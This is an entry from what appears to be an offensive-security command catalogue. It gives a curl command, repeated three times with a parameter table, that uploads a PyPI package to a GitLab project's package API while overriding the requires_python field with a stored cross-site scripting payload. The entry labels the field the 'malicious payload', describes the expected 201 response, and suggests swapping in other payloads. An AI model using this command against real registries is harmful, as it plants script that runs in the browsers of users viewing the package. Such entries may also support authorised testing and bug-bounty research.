---
id: cmd-upload-pypi-xss-856836
data: >-
  curl -v
  "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi"
  -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F
  name='package_test_1' -F requires_python='"><script>alert(1)</script>'
tags:
  - xss
  - upload
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.963Z'
verified: false
validated: true
submitted: true
---
# upload-pypi-package-xss

## Command

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

## Description

Uploads a PyPi package to GitLab's API with a stored XSS payload in the requires_python field, overriding the initial value to inject HTML-breaking JavaScript.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output for debugging | No |
| URL | GitLab API endpoint with auth | Yes |
| `-F content` | Path to package file | Yes |
| `-F requires_python=2.7` | Initial Python requirement (overridden) | No |
| `-F version=1` | Package version | Yes |
| `-F name` | Package name | Yes |
| `-F requires_python=payload` | Malicious payload for XSS | Yes |

## Examples

### Basic Usage

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

### Advanced Usage

Adjust project ID and token; use different payload for variation.

## Expected Output

HTTP/1.1 201 Created response with JSON package details, including stored metadata.

## Related

- [[Related Procedure: Upload-Malicious-PyPi-Package]]
